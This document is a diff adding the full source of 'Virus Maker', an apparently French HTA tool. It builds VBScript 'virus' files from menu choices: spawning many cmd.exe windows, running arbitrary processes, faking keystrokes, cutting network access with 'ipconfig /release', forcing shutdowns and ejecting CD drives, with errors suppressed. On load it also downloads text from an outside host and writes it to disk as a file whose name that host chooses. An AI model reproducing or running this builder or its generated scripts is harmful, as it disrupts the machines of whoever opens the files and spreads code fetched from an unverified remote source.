@@ -1,0 +1,592 @@
+<html>
+<head>
+<meta charset="ANSI">
+<title>Virus Maker</title>
+<HTA:APPLICATION
+  MAXIMIZEBUTTON="no"
+  ICON="mobsync.exe"
+  SCROLL="no"
+  SELECTION="no"
+  BORDER="thin"/>
+<script type="text/javascript">
+	var title_const = 0;
+	var message_const = 1;
+	var number_const = 2;
+	var name_const = 3;
+	var text_const = 4;
+	var path_const = 5;
+	
+	var Ubound_order = -1;
+	var Ubound_custom = -1;
+	
+	var temp_order;
+	var temp_custom;
+	var temp_Ubound_order;
+	
+	var PickFile = "";
+	var PickFolder = "";
+	
+	var current_virus_select = 0;
+	
+	var virus_text = "";
+	var virus_text2 = "";
+	var newline = 0;
+	
+	var order = [];
+	var custom = [];
+	var titles = ["Afficher un message", "Ouvrir CMD.exe", "Ouvrir un processus", "Attendre", "Écrire automatiquement", "Faire parler l'ordinateur", "Désactiver internet", "Créer un fichier texte", "Ouvrir le lecteur CD", "Arrêter l'ordinateur", "Faire beeper l'ordinateur", "Afficher le bureau"];
+	
+	var version = "3.5 beta 3"
+	
+	window.onload = LoadFunc;
+	
+	function infos() {
+		msgbox("Ce logiciel pourrait contenir quelques bugs.\nLe créateur n'est en aucun cas responsable des dommages causés par Virus Maker " + version + ".",64,"Virus Maker");
+	}
+	
+	function open_virus() {
+		Ubound_order = -1
+		var text, value, stage;
+		value = ""
+			fileBTN.click();
+			PickFile = fileBTN.value;
+			for(a = PickFile.length; a >= 0 ; a--) {
+				if (PickFile.substr(a, 1) === "\\") {
+					FILE.value = PickFile.substr(a+1, PickFile.length-4-a-1);
+					PickFolder = PickFile.substr(0, a);
+					a = -1;
+				}
+			}
+			if (new ActiveXObject("Scripting.FileSystemObject").FileExists(PickFile)) {
+				stage = 1;
+				text = new ActiveXObject("Scripting.FileSystemObject").OpenTextFile(PickFile,1).ReadAll();
+				for (i = 0; i <= text.length-2;  i++) {
+					if (stage == 1) {
+						if (text.substr(i,1) != "\n") {
+							value += text.substr(i,1);
+						} else {
+							Ubound_order+=1;
+							order[Ubound_order] = parseInt(value.substr(1));
+							value = "";
+						}
+						if ((text.substr(i,1) == "\n") & (text.substr(i+1,1) == "\n")) {
+							stage = 2;
+							ORDER_DIV.innerHTML = "";
+							for (a = 0; a <= Ubound_order; a++) {
+								current_Ubound_order = a;
+								virus_display(a);
+							}
+							Ubound_custom = -1;
+						}
+					}
+					if (stage == 2) {
+						if (text.substr(i+2,1) != "\n") {
+							value = value + text.substr(i+2,1);
+						} else {
+							newline += 1;
+							Ubound_custom+=1;
+							custom[Ubound_custom] = value.substr(1);
+							value = "";
+						}
+						if (newline >= Ubound_order*100+99) {
+							stage = 3;
+							newline = 0;
+						}
+					}
+				}
+				msgbox("completed",64,"Virus Maker");
+				new ActiveXObject("Scripting.FileSystemObject").OpenTextFile(PickFile).Close();
+			} else {
+				msgbox("File does not exist.",16,"Virus Maker");
+			}
+	}
+	
+	function parcourir() {
+		var F;//sets the variable
+		F = new ActiveXObject("Shell.Application").BrowseForFolder(0, "Veuillez choisir un fichier.", 0, "C:\\Users");//asks for a folder
+		if (F != null) {//if a folder was chosen
+			if (F.self.path != "C:\\Users") {
+				PickFolder = F.self.path;//if a user was chosen, and not the users folder, then set pickfolder to the folder
+			} else {
+				PickFolder = "";//else, pickfolder = ""
+			}
+		} else {
+			PickFolder = "";//else, pickfolder = ""
+		}
+		F = "";//resets the variable
+	}
+	
+	function move(way) {
+		if (way == 0) {
+		if ((current_virus_select > 0)&(current_virus_select <= Ubound_order)) {
+		ORDER_DIV.innerHTML = "";
+			temp_order = order[current_virus_select];
+			order[current_virus_select] = order[current_virus_select-1];
+			order[current_virus_select-1] = temp_order;
+			for (i = 0; i <= 99; i++) {
+				temp_custom = custom[current_virus_select*100 + i];
+				custom[current_virus_select*100 + i] = custom[(current_virus_select-1)*100 + i];
+				custom[(current_virus_select-1)*100 + i] = temp_custom;
+			}
+			for (i = 0; i <= Ubound_order; i++) {
+				virus_display(i);
+			}
+			current_virus_select -= 1;
+			ORDER_DIV(current_virus_select).selected = true;
+		}
+		}
+		if (way == 1) {
+		if (current_virus_select < Ubound_order) {
+		ORDER_DIV.innerHTML = "";
+			
+			temp_order = order[current_virus_select];
+			order[current_virus_select] = order[current_virus_select+1];
+			order[current_virus_select+1] = temp_order;
+			for (i = 0; i <= 99; i++) {
+				temp_custom = custom[current_virus_select*100 + i];
+				custom[current_virus_select*100 + i] = custom[(current_virus_select+1)*100 + i];
+				custom[(current_virus_select+1)*100 + i] = temp_custom;
+			}
+			for (i = 0; i <= Ubound_order; i++) {
+				virus_display(i);
+			}
+			current_virus_select += 1;
+			ORDER_DIV(current_virus_select).selected = true;
+		}
+		}
+	}
+	
+	function Virus_info_custom() {
+		//show the info written by the user
+		number = current_virus_select;
+		if (order[number] == 0) {
+			msgbox("        Titre : "+custom[number*100 + title_const]+"\n"+"Message : "+custom[number*100 + message_const],64,"Virus Maker");
+		} else if (order[number] == 1) {
+			msgbox("Nombre : "+custom[number*100 + number_const],64,"Virus Maker");
+		} else if (order[number] == 2) {
+			msgbox("Nom : "+custom[number*100 + name_const],64,"Virus Maker");
+		} else if (order[number] == 3) {
+			msgbox("Nombre de secondes : "+custom[number*100 + number_const],64,"Virus Maker");
+		} else if (order[number] == 4) {
+			msgbox("Texte : "+custom[number*100 + text_const],64,"Virus Maker");
+		} else if (order[number] == 5) {
+			msgbox("Texte : "+custom[number*100 + text_const],64,"Virus Maker");
+		} else if (order[number] == 6) {
+			msgbox("Aucune personalisation disponible.",16,"Virus Maker");
+		} else if (order[number] == 7) {
+			msgbox("Texte : "+custom[number*100 + text_const]+"\n"+"Path : "+custom[number*100 + path_const]+"\n"+"Nom : "+custom[number*100 + name_const],64,"Virus Maker");
+		} else if (order[number] == 8) {
+			msgbox("Aucune personalisation disponible.",16,"Virus Maker");
+		} else if (order[number] == 9) {
+			msgbox("Nombre de secondes d'attente : "+custom[number*100 + number_const],64,"Virus Maker");
+		} else if (order[number] == 10) {
+			msgbox("Nombre de beeps : "+custom[number*100 + number_const],64,"Virus Maker");
+		}
+	}
+	
+	function Virus_del() {
+		if (current_virus_select <= Ubound_order) {//if the currently selected virus isn't buggy
+			ORDER_DIV.innerHTML = "";//reset the left side of virus maker
+			//shift all the virus in order
+			for (i = 0; i <= Ubound_order; i++) {
+				if ((i >= current_virus_select)&&(i < Ubound_order)) {
+					order[i] = order[i+1];
+				}
+				for (a = 0; a <= 99; a++) {
+					if ((i >= current_virus_select)&&(i < Ubound_order)) {
+						custom[i*100 + a] = custom[(i+1)*100 + a];
+					}
+				}
+			}
+			//decrease Ubound_order by 1
+			order[Ubound_order] = undefined
+			Ubound_order -= 1;
+			
+			//resets the custumisation of the last virus
+			for (i = Ubound_custom-99; i <= Ubound_custom; i++) {
+				custom[i] = undefined
+			}
+			Ubound_custom -= 100;
+			//re-display the viruses on the left part of virus maker
+			for (i = 0; i <= Ubound_order; i++) {
+				//current_Ubound_order = i;
+				//Virus_add2(order[i]);
+				virus_display(order[i]);
+				//alert(i);
+			}
+			//set back the Ubound of custom
+			Ubound_custom = Ubound_order*100+99;
+		}
+		if (current_virus_select <= Ubound_order) {
+			ORDER_DIV(current_virus_select).selected = true;
+		}
+	}
+	
+	function IsNumeric(string) {
+		var numbers = "1234567890";//sets numbers
+		var isTrue = true;
+		var isNum = [];
+		for (i = 0; i <= string.length; i++) {//for each character in the string
+			for (n = 0; n <= numbers.length; n++) {//for each number in numbers
+				if (numbers.substr(n,1) == string.substr(i,1)) {//if the caracter equals the number, then the current character in string is a number
+					isNum[i] = true;
+				}
+			}
+		}
+		for (i = 0; i <= isNum.length-1; i++) {//for each item in the isNum array
+			if (isNum[i] != true) {//if any of the items is not a number(is false), isTrue = false
+				isTrue = false;
+			}
+		}
+		//if all of the items were true, return true. Else, return false
+		if (isTrue == true) {
+			return true;
+		} else {
+			return false;
+		}
+	}
+	
+	function Virus_custom() {
+		if ((current_virus_select <= Ubound_order) & (current_virus_select >= 0)) {//test if the current virus is a correct order
+		number = current_virus_select;
+		var x;
+		
+		Ubound_custom = Ubound_order*100+99;
+		if (order[number] == 0) {
+			x = prompt("Titre du message.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + title_const] = x;
+			x = "";
+			x = prompt("Message");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + message_const] = x;
+			x = "";
+			
+		} else if (order[number] == 1) {
+			x = prompt("Nombre de CMD.exe qui seront ouverts.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			if (IsNumeric(x) == false) {
+				msgbox("Veuillez entrer un nombre.",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + number_const] = x;
+			x = "";
+			
+		} else if (order[number] == 2) {
+			x = prompt("Nom du processus qui sera ouvert.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + name_const] = x;
+			x = "";
+			
+		} else if (order[number] == 3) {
+			x = prompt("Nombre de secondes d'attente.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			if (IsNumeric(x) == false) {
+				msgbox("Veuillez entrer un nombre.");
+				return;
+			}
+			custom[number*100 + number_const] = x;
+			x = "";
+			
+		} else if (order[number] == 4) {
+			x = prompt("Texte qui sera automatiquement écrit.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;;
+			}
+			custom[number*100 + text_const] = x;
+			x = "";
+			
+		} else if (order[number] == 5) {
+			x = prompt("Texte qui sera automatiquement dit.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + text_const] = x;
+			x = "";
+			
+		} else if (order[number] == 6) {
+			//msgbox("Aucune personalisation disponible.",16,"Virus Maker");
+			
+		} else if (order[number] == 7) {
+			var F = CreateObject("Shell.Application").BrowseForFolder(0, "", 0, "C:\Users");
+			if (F == null) {
+				custom[number*100 + path_const] = F.self.path;
+			}
+			F = "";
+			x = prompt("Nom du fichier (avec extension .txt pour document texte)");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + name_const] = x;
+			x = prompt("Texte que le fichier contiendra.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + text_const] = x;
+			x = "";
+			
+		} else if (order[number] == 8) {
+			//msgbox("Aucune personalisation disponible.",16,"Virus Maker");
+			
+		} else if (order[number] == 9) {
+			x = prompt("Nombre secondes avant l'arret du systeme.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			if (IsNumeric(x) == false) {
+				msgbox("Veuillez entrer un nombre.",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + number_const] = x;
+			x = "";
+			
+		} else if (order[number] == 10) {
+			x = prompt("Nombre de beeps que l'ordinateur fera.");
+			if (x == null) {
+				msgbox("canceled",64,"Virus Maker");
+				return;
+			}
+			if (IsNumeric(x) == false) {
+				msgbox("Veuillez entrer un nombre.",64,"Virus Maker");
+				return;
+			}
+			custom[number*100 + number_const] = x;
+			x = "";
+			
+		} else if (order[number] == 11) {
+			//msgbox("Aucune personalisation disponible.",16,"Virus Maker");
+			
+		} else {
+			msgbox("Voici la personnalisation du virus #"+number+". (virus "+order[number]+")",64,"Virus Maker");
+		}
+		}
+	}
+	
+	function Virus_add(number) {
+		Ubound_order += 1;//get ready for a new virus creation
+		order[Ubound_order] = number;//store the virus' id into order[the current virus]
+		Ubound_custom = Ubound_order*100+99;//sets the Ubound of the custom array
+		
+		//display the viruses on the left
+		virus_display(Ubound_order);
+		current_virus_select = Ubound_order;
+		
+		Ubound_custom = Ubound_order*100+99;//sets the Ubound of the custom array
+		Virus_custom();
+	}
+	
+	function virus_display(number) {
+		//show the virus on the left
+		var objOption = document.createElement("OPTION");
+		objOption.text = titles[order[number]];
+		objOption.value = number;
+		ORDER_DIV.add(objOption);
+	}
+	
+	
+	function make_openable() {
+		virus_text2 = "";//resets virus_text2
+		for (i = 0; i <= Ubound_order; i++) {
+			virus_text2 = virus_text2+"\'"+order[i].toString()+"\n";
+		}
+		virus_text2 = virus_text2+"\n";//add a new line at the end of virus_text2
+		for (i = 0; i <= Ubound_custom; i++) {
+			virus_text2 = virus_text2+"\'"+custom[i]+"\n";
+		}
+		//creates the virus file
+		if ((FILE.value != "") & (PickFolder != "")) {
+			PickFile = PickFolder+"\\"+FILE.value+".vbs";
+			PickFile.split("\\").join("\\\\");
+			var virus_file = new ActiveXObject("Scripting.FileSystemObject").CreateTextFile(PickFile);
+				virus_file.write(virus_text2 + "\n" + virus_text);
+				virus_file.close();
+			msgbox("completed",64,"Virus Maker");
+		} else {
+			msgbox("Please enter path and file name.",16,"Virus Maker");
+		}
+	}
+	
+	function Save() {
+		try{
+		virus_text = "";//reset virus_text
+		var errlevel = 0;//sets no errors
+		if ((FILE.value != "")&(PickFolder != "")) {//checks to see if a path and a filename are entered
+			PickFile = PickFolder+"\\"+FILE.value+".vbs";//makes the virus' name and path + .vbs extension
+			//Ubound_custom = Ubound_order*100+99;
+			virus_text += "On Error Resume Next";//makes sure that no errors are displayed on the virus file
+			for (i = 0; i <= Ubound_order; i++) {//for each virus
+				try {
+					//add the specific virus code in virus-text
+					if (order[i] == 0) {
+						virus_text = virus_text+"\n"+"msgbox \""+custom[i*100 + message_const].split("\"").join("\"\"")+"\", ,\""+custom[i*100 + title_const].split("\"").join("\"\"")+"\"";
+					} else if (order[i] == 1) {
+						virus_text = virus_text+"\n"+"for i = 1 to "+custom[i*100 + number_const].split("\"").join("\"\"")+"\n"+"CreateObject(\"Wscript.Shell\").Run \"cmd.exe\""+"\n"+"Next";
+					} else if (order[i] == 2) {
+						virus_text = virus_text+"\n"+"CreateObject(\"Wscript.shell\").Run \""+custom[i*100 + name_const].split("\"").join("\"\"")+"\"";
+					} else if (order[i] == 3) {
+						virus_text = virus_text+"\n"+"Wscript.Sleep "+custom[i*100 + number_const].split("\"").join("\"\"")*1000;
+					} else if (order[i] == 4) {
+						virus_text = virus_text+"\n"+"CreateObject(\"Wscript.shell\").Sendkeys \""+custom[i*100 + text_const].split("\"").join("\"\"")+"\"";
+					} else if (order[i] == 5) {
+						virus_text = virus_text+"\n"+"CreateObject(\"Sapi.SPVoice\").Speak \""+custom[i*100 + text_const].split("\"").join("\"\"")+"\"";
+					} else if (order[i] == 6) {
+						virus_text = virus_text+"\n"+"CreateObject(\"Wscript.shell\").Run \"cmd.exe /c ipconfig /release\",0";
+					} else if (order[i] == 7) {
+						virus_text = virus_text+"\n"+"CreateObject(\"Scripting.FileSystemObject\").OpenTextFile (\"" +custom[i*100 + path_const].split("\"").join("\"\"")+ "\\" + custom[i*100 + name_const].split("\"").join("\"\"") + "\",2,True).Write \"" +custom[i*100 + text_const].split("\"").join("\"\"")+ "\"" ;
+					} else if (order[i] == 8) {
+						virus_text = virus_text+"\n"+"if CreateObject(\"WMPlayer.OCX.7\").cdromCollection.count >= 1 then"+"\n"+"For i = 0 to CreateObject(\"WMPlayer.OCX.7\").cdromCollection.count-1"+"\n"+"CreateObject(\"WMPlayer.OCX.7\").cdromCollection.Item(i).Eject"+"\n"+"next"+"\n"+"End If"+"\n"+"Wscript.sleep 1000";
+					} else if (order[i] == 9) {
+						virus_text = virus_text+"\n"+"CreateObject(\"Wscript.shell\").Run \"cmd.exe /c shutdown -s -t " +custom[i*100 + number_const].split("\"").join("\"\"")+ "\",0";
+					} else if (order[i] == 10) {
+						virus_text = virus_text+"\n"+"for i = 1 to "+custom[i*100 + number_const].split("\"").join("\"\"")+"\n"+"CreateObject(\"Wscript.shell\").Run \"cmd.exe /c echo \" & Chr(7),0"+"\n"+"Wscript.Sleep 500"+"\n"+"Next";
+					} else if (order[i] == 11) {
+						virus_text = virus_text+"\n"+"CreateObject(\"Shell.Application\").MinimizeAll";
+					}
+				}
+				catch(e) {
+					//if some customizations are not correctly filled
+					msgbox("Certaines Personalisations ne sont pas remplies.",16,"Virus Maker");
+					errlevel = 1;
+				}
+			}
+			if (errlevel == 0){
+				//if there were no errors, run the code to make an openable virus file
+				virus_text2 = "";//resets virus_text2
+				for (i = 0; i <= Ubound_order; i++) {
+					virus_text2 = virus_text2+"\'"+order[i].toString()+"\n";
+				}
+				virus_text2 = virus_text2+"\n";//add a new line at the end of virus_text2
+				for (i = 0; i <= Ubound_custom; i++) {
+					virus_text2 = virus_text2+"\'"+custom[i]+"\n";
+				}
+				//creates the virus file
+				if ((FILE.value != "") & (PickFolder != "")) {
+					PickFile = PickFolder+"\\"+FILE.value+".vbs";
+					PickFile.split("\\").join("\\\\");
+					var virus_file = new ActiveXObject("Scripting.FileSystemObject").CreateTextFile(PickFile);
+						virus_file.write(virus_text2 + "\n" + virus_text);
+						virus_file.close();
+					msgbox("completed",64,"Virus Maker");
+				} else {
+					msgbox("Please enter path and file name.",16,"Virus Maker");
+				}
+			}
+		} else {
+			msgbox("Please enter path and file name.",16,"Virus Maker");
+		}
+		} catch(e) {
+		alert("ERROR IN FUNCTION Save() : " + e,64,"Virus Maker");}
+	}
+	
+	
+	function Virus_select() {
+		current_virus_select = parseInt(ORDER_DIV.value);
+	}
+	
+	function msgbox(message,number,title) {
+		return new ActiveXObject("Wscript.Shell").Popup(message,10,title,number)//return an msgbox
+	}
+	
+	function LoadFunc() {
+		var width = 650;
+		var height = 325;
+		window.resizeTo(width,height);
+		window.moveTo(screen.width/2-width/2,screen.height/2-height/2);
+		
+		document.title = "Virus Maker " + version;
+		document.getElementById("version_font").innerHTML = version;
+		
+		if (new ActiveXObject("Scripting.FileSystemObject").GetFile(document.location.pathname).attributes == 32) {
+			alert("Err_Copy_32","Virus Maker");
+			self.close();
+		} else {
+			infos();
+		}
+		newVersion();
+	}
+	
+	function newVersion() {
+		var ie = new ActiveXObject("internetExplorer.Application");
+		var yes = 6;
+		ie.navigate("http://emilien.ml/Virus Maker/version.txt");
+		while(ie.readyState != 4){}
+		if(ie.document.body.innerText > "3.53"){
+			var btn = msgbox("Une nouvelle version de Virus Maker est disponible !\nVoulez-vous la télécharger ?", 4+64);
+			if(btn == 6){
+				ie.quit();
+				var ie = new ActiveXObject("internetExplorer.Application");
+				ie.navigate("http://emilien.ml/Virus Maker/source.txt");
+				while(ie.readyState != 4){}
+				var content = ie.document.body.innerText;
+				
+				ie.navigate("http://emilien.ml/Virus Maker/name.txt");
+				while(ie.readyState != 4){}
+				var name = ie.document.body.innerText;
+				
+				var file = new ActiveXObject("Scripting.FileSystemObject").OpenTextFile(name, 2, true)
+				file.Write(content);
+				file.Close();
+				
+				new ActiveXObject("Scripting.FileSystemObject").GetFile(name).attributes = 0;
+			}
+		}
+		ie.quit();
+	}
+</script>
+</head>
+<body STYLE="overflow:hidden;margin:10px;background:black;color:lime;">
+	<input type="file" ID="fileBTN" STYLE="position:absolute;left:-100%;">
+	<div STYLE="position:absolute;left:200px;top:10px;">
+		<font STYLE="font-size:50;color:lime;">Virus Maker</font><font STYLE="font-size:15;color:lime;" id="version_font"></font>
+		<!--<font STYLE="font-size:75;color:red;">&#9763;</font>
+		<font STYLE="font-size:40;color:lime;"></font>-->
+	</div>
+	<select size="10" onclick="Virus_select()" ID="ORDER_DIV" STYLE="border:1px solid #cccccc;text-align:right;position:absolute;left:10px;bottom:10px;height:200px;width:250px;background:black;color:lime;overflow-y:scroll;">
+	</select>
+	<div STYLE="border:1px solid #cccccc;text-align:right;position:absolute;right:10px;bottom:10px;height:200px;width:250px;overflow-y:scroll;">
+		<input type="button" value="Afficher un message" onclick="Virus_add(0)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Affiche un message à l\'utilisateur', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Ouvrir CMD.exe" onclick="Virus_add(1)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Ouvre CMD.exe autant de fois que voulu.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Ouvrir un processus" onclick="Virus_add(2)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Exécute un processus voulu.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Attendre" onclick="Virus_add(3)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Attend le nombre de secondes voulues.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Écrire automatiquement" onclick="Virus_add(4)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Fait écrire le clavier automatiquement.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Faire parler l'ordinateur" onclick="Virus_add(5)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Fait parler l\'ordinateur automatiquement.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Désactiver internet" onclick="Virus_add(6)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Désactive internet.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Créer un fichier texte" onclick="Virus_add(7)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Crée un fichier avec du texte à l\'intérieur.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Ouvrir le lecteur CD" onclick="Virus_add(8)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Ouvre le lecteur CD.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Arrêter l'ordinateur" onclick="Virus_add(9)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Arrête l\'ordinateur après un nombre de secondes désiréesé', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Faire beeper l'ordinateur" onclick="Virus_add(10)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Fait beeper l\'ordinateur autant de fois que voulu.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+		<input type="button" value="Afficher le bureau" onclick="Virus_add(11)" STYLE="width:205;background:black;color:lime;"><input type="button" value="?" onclick="msgbox('Affiche le bureau.', 64, 'Virus Maker')" STYLE="width:25;background:black;color:lime;"><br>
+	</div>
+	<div STYLE="position:absolute;left:275;bottom:10px;">
+		<input type="button" value="Parcourir" onclick="parcourir()" STYLE="width:75px;background:black;color:lime;"><br>
+		<input type="text" ID="FILE" STYLE="width:75px;background:black;color:lime;"><br>
+		<input type="Submit" value="Enregistrer" OnClick="Save()" STYLE="width:75px;background:black;color:lime;"><br>
+		<input type="button" value="Ouvrir" onclick="open_virus()" STYLE="width:75px;background:black;color:lime;"><br>
+		<!--<input type="button" value="Save" onclick="enregistrer" STYLE="width:75px;background:black;color:lime;">--><br><br>
+		<input type="button" value="<" onclick="move(0)" STYLE="width:25px;background:black;color:lime;"><input type="button" value=">" onclick="move(1)" STYLE="width:25px;background:black;color:lime;"><input type="button" value="X" onclick="Virus_del()" STYLE="width:25px;background:black;color:lime;"><br>
+		<input type="button" value="....." onclick="Virus_custom()" STYLE="width:50px;background:black;color:lime;"><input type="button" value="?" onclick="Virus_info_custom()" STYLE="width:25px;background:black;color:lime;">
+	</div>
+	<input type="button" value="infos" onclick="infos()" STYLE="position:absolute;top:10px;left:10px;color:lime;background:black;">
+	<font STYLE="position:absolute;top:10px;right:10px;font-size:10;color:lime;">Par Emilien Breton</font>
+</body>
+</html>
